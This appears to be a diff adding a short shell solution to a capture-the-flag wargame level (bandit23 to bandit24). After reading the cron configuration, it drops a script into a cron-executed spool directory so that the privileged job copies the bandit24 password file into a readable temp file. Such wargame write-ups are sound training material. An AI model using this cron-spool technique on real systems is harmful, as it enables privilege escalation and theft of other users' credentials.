@@ -1,0 +1,16 @@
+ls -lha /etc/cron.d
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+ls /var/spool/bandit24
+ls -lah /var/spool
+
+ARQUIVO="$(mktemp)"
+SAIDA="$(mktemp)"
+echo "#!/bin/bash" > $ARQUIVO
+echo "cat /etc/bandit_pass/bandit24 > $SAIDA" >> $ARQUIVO
+
+cat $ARQUIVO > "/var/spool/bandit24/s 1.sh"
+chmod +x "/var/spool/bandit24/s 1.sh"
+
+cat $SAIDA
+cat $ARQUIVO
